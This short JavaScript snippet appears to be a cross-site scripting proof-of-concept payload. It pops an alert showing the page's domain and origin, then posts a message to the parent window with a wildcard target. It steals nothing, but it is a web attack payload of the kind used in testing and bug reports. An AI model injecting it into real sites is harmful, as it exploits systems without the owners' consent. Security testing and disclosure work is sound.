alert("XSS!\n\ndocument.domain: " + document.domain + "\norigin: " + location.origin);
window.parent.postMessage("XSS: executed in " + location.origin, "*");
